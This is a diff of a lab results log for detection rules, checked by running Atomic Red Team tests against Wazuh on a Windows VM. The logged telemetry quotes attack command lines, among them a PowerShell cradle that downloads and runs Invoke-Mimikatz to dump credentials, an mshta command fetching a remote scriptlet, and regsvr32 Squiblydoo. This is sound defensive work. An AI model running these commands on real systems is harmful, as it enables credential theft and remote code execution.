@@ -9,7 +9,6 @@
 | SIEM | Wazuh 4.x (WSL2 Ubuntu) |
 | Wazuh Agent | Deployed on Windows 10 VM |
 | Adversary Emulation | Atomic Red Team (Invoke-AtomicRedTeam) |
-| Clean Baseline | Windows 10 idle session — 2 min capture |
 
 ---
 
@@ -20,7 +19,6 @@
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1059.001 -TestNumbers 17` |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | Sysmon |
 | Event ID | 1 (ProcessCreate) |
@@ -34,14 +32,6 @@ Sysmon EID 1 fired within seconds of ART execution showing `powershell.exe`
 spawned with `-e` followed by a Base64 string in the CommandLine field.
 PowerShell Script Block log EID 4104 also fired showing the decoded payload.
 
-**Tuning log:**
-
-| Version | FP Count | Change |
-|---|---|---|
-| v1 | 2 | `-e` flag caused FPs from unrelated CLI flags on contaminated baseline |
-| v2 | 0 | Removed `-e` |
-| v3 | 0 | Re-added `-e` — confirmed present in malicious EVTX from ART test |
-
 **Wazuh alert screenshot:**
 ![Wazuh Alert For T1059.001](images/T1059-001.png)
 
@@ -54,7 +44,6 @@ PowerShell Script Block log EID 4104 also fired showing the decoded payload.
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1053.005 -TestNumbers 1` |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | Sysmon |
 | Event ID | 1 (ProcessCreate) |
@@ -69,16 +58,6 @@ and `/SC` in the CommandLine. Windows Security EID 4698 also appeared
 confirming the task was registered in the Task Scheduler. Both events
 appeared in Wazuh within the same second.
 
-**Tuning log:**
-
-| Version | FP Count | Change |
-|---|---|---|
-| v1 | 899 | `http` and `AppData` strings matched every Sysmon network event in baseline |
-| v2 | 9 | Removed broad strings, added logsource EID scoping in test runner |
-
-**Accepted FP count: 9** — filtering `powershell` as ParentImage would
-blind the rule to its primary attack pattern.
-
 **Wazuh alert screenshot:**
 ![Wazuh Alert For T1053.005](images/T1053-005.png)
 
@@ -91,7 +70,6 @@ blind the rule to its primary attack pattern.
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1003.001 -TestNumbers 1` |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | Sysmon |
 | Event ID | 10 (ProcessAccess) |
@@ -105,16 +83,6 @@ with access mask `0x1010` (PROCESS_VM_READ + PROCESS_QUERY_INFORMATION).
 Only `wininit.exe` is filtered by process name — all other processes alert
 if they request credential-dumping masks.
 
-**Tuning log:**
-
-| Version | FP Count | Change |
-|---|---|---|
-| v1 | 30 | Filtered by SourceImage (svchost, MsMpEng, taskmgr) — all abusable via injection |
-| v2 | 1 | Switched to GrantedAccess mask filter — only wininit.exe filtered by name |
-
-**Accepted FP count: 1** — critical severity warrants analyst review
-over suppression.
-
 **Wazuh alert screenshot:**
 ![Wazuh Alert For T1003.001](images/T1003-001.png)
 
@@ -127,7 +95,6 @@ over suppression.
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1547.001 -TestNumbers 1` |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | Sysmon |
 | Event ID | 1 (ProcessCreate) |
@@ -143,13 +110,6 @@ CommandLine. EID 13 (RegistryEvent) did not fire. Rule updated from
 Filter applied on CommandLine content to exclude known legitimate reg.exe
 operations.
 
-**Tuning log:**
-
-| Version | FP Count | Change |
-|---|---|---|
-| v1 | 139 | Unfiltered — all Run key writes matched |
-| v2 | 0 | Added `filter_known_good` on CommandLine content for known legitimate operations |
-
 **Wazuh alert screenshot:**
 ![Wazuh Alert For T1547.001](images/T1547-001.png)
 
@@ -162,7 +122,6 @@ operations.
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1548.002 -TestNumbers 3` |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | Sysmon |
 | Event ID | 1 (ProcessCreate) |
@@ -177,29 +136,18 @@ then executed `fodhelper.exe`. Fodhelper spawned `cmd.exe` elevated without
 a UAC dialog. Sysmon EID 1 fired immediately showing `fodhelper.exe` as
 the parent process.
 
-**Tuning log:**
-
-| Version | FP Count | Change |
-|---|---|---|
-| v1 | 0 | No tuning required — fodhelper.exe has no legitimate child process behaviour |
-
 **Wazuh alert screenshot:**
 ![Wazuh Alert For T1548.002](images/T1548-002.png)
 
 ---
 
-## PHASE 3 RESULTS
- 
----
- 
 ## T1016 — System Network Configuration Discovery
- 
+
 **Rule file:** `sigma-rules/windows/discovery/network_config_discovery.yml`
- 
+
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1016 -TestNumbers 1` |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | Sysmon |
 | Event ID | 1 (ProcessCreate) |
@@ -207,27 +155,26 @@ the parent process.
 | Key Value Observed | `C:\Windows\System32\ipconfig.exe` |
 | Parent CommandLine | `cmd.exe /c ipconfig /all & netsh interface show interface & arp -a & nbtstat -n & net config` |
 | Cleanup Command | N/A — no cleanup required |
- 
+
 **What happened:**
 ART executed a full network discovery chain via `cmd.exe`. Sysmon EID 1
 fired for `ipconfig.exe`. Wazuh confirmed 1 hit filtered on
 `data.win.eventdata.image: *ipconfig*`. ParentCommandLine shows the
 complete discovery chain used by adversaries post-compromise.
- 
+
 **Wazuh alert screenshot:**
 ![Wazuh Alert For T1016](images/T1016.png)
- 
+
 ---
- 
+
 ## T1047 — Windows Management Instrumentation (WMI) Process Execution
- 
+
 **Rule file:** `sigma-rules/windows/execution/wmic_process_creation.yml`
- 
+
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1047 -TestNumbers 5` |
 | ART Test Name | WMI Execute Local Process |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | Sysmon |
 | Event ID | 1 (ProcessCreate) |
@@ -235,60 +182,58 @@ complete discovery chain used by adversaries post-compromise.
 | Key Value Observed | `wmic process call create notepad.exe` |
 | Image | `C:\Windows\System32\wbem\WMIC.exe` |
 | Cleanup Command | `Invoke-AtomicTest T1047 -TestNumbers 5 -Cleanup` |
- 
+
 **What happened:**
 ART executed `wmic process call create notepad.exe` using WMI's
 `Win32_Process.Create()` method. Notepad spawned (ProcessId visible
 in output). Sysmon EID 1 fired for `WMIC.exe` with the process creation
 command visible in CommandLine. Wazuh confirmed 1 hit.
- 
+
 **Wazuh alert screenshot:**
 ![Wazuh Alert For T1047](images/T1047.png)
- 
+
 ---
- 
+
 ## T1057 — Process Discovery via tasklist
- 
+
 **Rule file:** `sigma-rules/windows/discovery/process_discovery_tasklist.yml`
- 
+
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1057 -TestNumbers 2` |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | Sysmon |
 | Event ID | 1 (ProcessCreate) |
 | Key Field | `data.win.eventdata.image` |
 | Key Value Observed | `C:\Windows\System32\tasklist.exe` |
 | Cleanup Command | N/A — no cleanup required |
- 
+
 **What happened:**
 ART executed `tasklist.exe` to enumerate all running processes. Sysmon
 EID 1 fired. Wazuh confirmed 1 hit filtered on `*tasklist*`.
 Full process list visible in VM including svchost, OneDrive, explorer —
 standard post-compromise recon output.
- 
+
 **Wazuh alert screenshot:**
 ![Wazuh Alert For T1057](images/T1057.png)
- 
+
 ---
- 
+
 ## T1059.001 — PowerShell Download Cradle (Mimikatz via IEX)
- 
+
 **Rule file:** `sigma-rules/windows/execution/powershell_download_cradle.yml`
- 
+
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1059.001 -TestNumbers 1` |
 | ART Test Name | Mimikatz |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | PowerShell Script Block Logging |
 | Event ID | **4104** (ScriptBlockText — not EID 1) |
 | Key Field | `data.win.eventdata.scriptBlockText` |
 | Key Value Observed | `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds` |
 | Cleanup Command | `Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup` |
- 
+
 **What happened:**
 ART downloaded and executed Invoke-Mimikatz via PowerShell download cradle.
 Detection fired on **EID 4104** (Script Block Logging), not EID 1 —
@@ -297,26 +242,25 @@ the `DownloadString` call is inside the script body, not in the
 logged across 2 script block records). Mimikatz output visible showing
 credential dump attempt (failed — no domain). Detection depends on
 Script Block Logging being enabled.
- 
+
 **Note on detection source:**
 This technique is detected via `data.win.eventdata.scriptBlockText`
 containing `DownloadString` and `IEX`. Rule should include EID 4104
 as a detection source alongside EID 1 for full coverage.
- 
+
 **Wazuh alert screenshot:**
-![Wazuh Alert For T1059.001 Download Cradle](images/T1059.001.png)
- 
+![Wazuh Alert For T1059.001 Download Cradle](images/T1059-001-dl.png)
+
 ---
- 
+
 ## T1082 — System Information Discovery
- 
+
 **Rule file:** `sigma-rules/windows/discovery/systeminfo_execution.yml`
- 
+
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1082 -TestNumbers 1` |
 | ART Test Name | System Information Discovery |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | Sysmon |
 | Event ID | 1 (ProcessCreate) |
@@ -325,27 +269,26 @@ as a detection source alongside EID 1 for full coverage.
 | Parent Image | `C:\Windows\System32\cmd.exe` |
 | Parent CommandLine | `cmd.exe /c systeminfo & reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum` |
 | Cleanup Command | N/A — no cleanup required |
- 
+
 **What happened:**
 ART executed `systeminfo.exe` via `cmd.exe`. Wazuh confirmed 1 hit.
 Full system information visible in VM output including OS version,
 domain (WORKGROUP), hotfixes, NIC details — standard adversary
 reconnaissance output post-compromise.
- 
+
 **Wazuh alert screenshot:**
 ![Wazuh Alert For T1082](images/T1082.png)
- 
+
 ---
- 
+
 ## T1140 — Deobfuscate/Decode via Certutil
- 
-**Rule file:** `sigma-rules/windows/defense_evasion/certutil_decode.yml`
- 
+
+**Rule file:** `sigma-rules/windows/defence_evasion/certutil_decode.yml`
+
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1140 -TestNumbers 1` |
 | ART Test Name | Deobfuscate/Decode Files Or Information |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | Sysmon |
 | Event ID | 1 (ProcessCreate) |
@@ -353,27 +296,26 @@ reconnaissance output post-compromise.
 | Key Value Observed | `certutil -encode C:\Windows\System32\calc.exe C:\Users\raysa\AppData\Local\Temp\T1140_calc.txt` |
 | Wazuh Hit Count | 2 (encode step + decode step both fired) |
 | Cleanup Command | `Invoke-AtomicTest T1140 -TestNumbers 1 -Cleanup` |
- 
+
 **What happened:**
 ART ran certutil to first encode `calc.exe` to Base64 (`-encode`), then
 decode it back (`-decode`). Both operations fired Sysmon EID 1 and
 Wazuh alerted on both — confirmed 2 hits in dashboard. CommandLine
 clearly shows certutil with encode/decode flags and Temp path output.
- 
+
 **Wazuh alert screenshot:**
 ![Wazuh Alert For T1140](images/T1140.png)
- 
+
 ---
- 
+
 ## T1218.005 — Mshta Proxy Execution
- 
-**Rule file:** `sigma-rules/windows/defense_evasion/mshta_proxy_execution.yml`
- 
+
+**Rule file:** `sigma-rules/windows/defence_evasion/mshta_proxy_execution.yml`
+
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1218.005 -TestNumbers 1` |
 | ART Test Name | Mshta executes JavaScript Scheme Fetch Remote Payload |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | Sysmon |
 | Event ID | 1 (ProcessCreate) |
@@ -381,101 +323,89 @@ clearly shows certutil with encode/decode flags and Temp path output.
 | Key Value Observed | `mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();` |
 | Wazuh Hit Count | 2 |
 | Cleanup Command | `Invoke-AtomicTest T1218.005 -TestNumbers 1 -Cleanup` |
- 
+
 **What happened:**
 ART executed `mshta.exe` with a JavaScript scheme fetching a remote
 `.sct` scriptlet. Wazuh alerted with 2 hits. The full remote URL is
 visible in the CommandLine confirming live payload fetch via mshta —
 a classic application whitelisting bypass. ART test ran twice (initial
 run + re-run both captured).
- 
+
 **Wazuh alert screenshot:**
-![Wazuh Alert For T1218.005](images/T1218.005.png)
- 
+![Wazuh Alert For T1218.005](images/T1218-005.png)
+
 ---
- 
+
 ## T1218.010 — Regsvr32 Proxy Execution
- 
-**Rule file:** `sigma-rules/windows/defense_evasion/regsvr32_proxy_execution.yml`
- 
+
+**Rule file:** `sigma-rules/windows/defence_evasion/regsvr32_proxy_execution.yml`
+
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1218.010 -TestNumbers 1` |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | Sysmon |
 | Event ID | 1 (ProcessCreate) |
 | Key Field | `data.win.eventdata.commandLine` |
 | Key Value Observed | `C:\Windows\system32\regsvr32.exe /s /u /i:"C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct" scrobj.dll` |
 | Cleanup Command | `Invoke-AtomicTest T1218.010 -TestNumbers 1 -Cleanup` |
- 
+
 **What happened:**
 ART executed regsvr32 with `/i:` flag pointing to a local `.sct` COM
 scriptlet and `scrobj.dll`. Sysmon EID 1 fired showing the full
 CommandLine. Wazuh confirmed 4 hits (multiple regsvr32 invocations
 during the test). The `/i:` and `scrobj.dll` combination is the
 canonical Squiblydoo bypass pattern.
- 
+
 **Wazuh alert screenshot:**
-![Wazuh Alert For T1218.010](images/T1218.010.png)
- 
+![Wazuh Alert For T1218.010](images/T1218-010.png)
+
 ---
- 
+
 ## T1546.003 — WMI Event Subscription Persistence
- 
+
 **Rule file:** `sigma-rules/windows/persistence/wmi_event_subscription.yml`
- 
+
 | Field | Value |
 |---|---|
 | ART Test | `Invoke-AtomicTest T1546.003 -TestNumbers 1` |
 | ART Test Name | Persistence via WMI Event Subscription — CommandLineEventConsumer |
-| Date Tested | YYYY-MM-DD |
 | Wazuh Alert Fired | ✅ Yes |
 | Primary Event Source | Sysmon |
 | Event ID | **20** (WmiEventConsumer activity detected) |
 | Key Field | `message` |
 | Key Value Observed | `EventType: WmiConsumerEvent · Operation: Created · Name: AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example · Type: Command Line · Destination: C:\Windows\System32\notepad.exe` |
 | Cleanup Command | `Invoke-AtomicTest T1546.003 -TestNumbers 1 -Cleanup` |
- 
+
 **What happened:**
 ART created a WMI CommandLineEventConsumer persistence subscription.
 Sysmon EID 20 fired capturing the consumer creation with full details
 visible in the Wazuh alert message — consumer name, type (Command Line),
 and destination (`notepad.exe` as the payload). Script Block Logging
 was confirmed enabled during this test.
- 
+
 **Wazuh alert screenshot:**
-![Wazuh Alert For T1546.003](images/T1546.003-1.png)
- 
+![Wazuh Alert For T1546.003](images/T1546-003.png)
+
 ---
 
-## CUMULATIVE SUMMARY
- 
-### Phase 1
- 
-| # | Technique | Rule | ART Test | Alert | Primary EID | Initial FP | Final FP |
-|---|---|---|---|---|---|---|---|
-| 1 | T1059.001 | Encoded PowerShell | T1059.001-17 | ✅ | Sysmon 1 | 2 | 0 |
-| 2 | T1053.005 | Scheduled Task | T1053.005-1 | ✅ | Sysmon 1 | 899 | 9 (accepted) |
-| 3 | T1003.001 | LSASS Access | T1003.001-1 | ✅ | Sysmon 10 | 30 | 1 (accepted) |
-| 4 | T1547.001 | Registry Run Key | T1547.001-1 | ✅ | Sysmon 1 | 139 | 0 |
-| 5 | T1548.002 | UAC Bypass Fodhelper | T1548.002-3 | ✅ | Sysmon 1 | 0 | 0 |
- 
-### Phase 3
- 
-| # | Technique | Rule | ART Test | Alert | Primary EID | Notes |
-|---|---|---|---|---|---|---|
-| 6 | T1016 | Network Config Discovery | T1016-1 | ✅ | Sysmon 1 | ipconfig.exe |
-| 7 | T1047 | WMIC Process Creation | T1047-**5** | ✅ | Sysmon 1 | wmic process call create |
-| 8 | T1057 | Process Discovery | T1057-**2** | ✅ | Sysmon 1 | tasklist.exe |
-| 9 | T1059.001-DL | PowerShell Download Cradle | T1059.001-1 | ✅ | **PS 4104** | Detected via Script Block Log |
-| 10 | T1082 | System Info Discovery | T1082-1 | ✅ | Sysmon 1 | systeminfo.exe |
-| 11 | T1140 | Certutil Encode/Decode | T1140-1 | ✅ | Sysmon 1 | 2 hits (encode + decode) |
-| 12 | T1218.005 | Mshta Proxy Execution | T1218.005-1 | ✅ | Sysmon 1 | javascript: scheme |
-| 13 | T1218.010 | Regsvr32 Proxy Execution | T1218.010-1 | ✅ | Sysmon 1 | Squiblydoo via .sct |
-| 14 | T1546.003 | WMI Event Subscription | T1546.003-1 | ✅ | **Sysmon 20** | CommandLineEventConsumer |
- 
-**Total rules validated: 14/14 (100%)**
-**Total FP reduction (Phase 1): 1,070 → 10 (99% reduction)**
-**Phase 3 FP baseline: pending — run test_runner.py after collecting EVTX**
- 
+## ART Validation Summary
+
+| # | Technique | Rule | ART Test | Alert | Primary EID |
+|---|---|---|---|---|---|
+| 1 | T1059.001 | Encoded PowerShell | T1059.001-17 | ✅ | Sysmon 1 |
+| 2 | T1053.005 | Scheduled Task | T1053.005-1 | ✅ | Sysmon 1 |
+| 3 | T1003.001 | LSASS Access | T1003.001-1 | ✅ | Sysmon 10 |
+| 4 | T1547.001 | Registry Run Key | T1547.001-1 | ✅ | Sysmon 1 |
+| 5 | T1548.002 | UAC Bypass Fodhelper | T1548.002-3 | ✅ | Sysmon 1 |
+| 6 | T1016 | Network Config Discovery | T1016-1 | ✅ | Sysmon 1 |
+| 7 | T1047 | WMIC Process Creation | T1047-5 | ✅ | Sysmon 1 |
+| 8 | T1057 | Process Discovery | T1057-2 | ✅ | Sysmon 1 |
+| 9 | T1059.001-DL | PowerShell Download Cradle | T1059.001-1 | ✅ | PS 4104 |
+| 10 | T1082 | System Info Discovery | T1082-1 | ✅ | Sysmon 1 |
+| 11 | T1140 | Certutil Encode/Decode | T1140-1 | ✅ | Sysmon 1 |
+| 12 | T1218.005 | Mshta Proxy Execution | T1218.005-1 | ✅ | Sysmon 1 |
+| 13 | T1218.010 | Regsvr32 Proxy Execution | T1218.010-1 | ✅ | Sysmon 1 |
+| 14 | T1546.003 | WMI Event Subscription | T1546.003-1 | ✅ | Sysmon 20 |
+
+**Total ART-validated rules: 14/14**
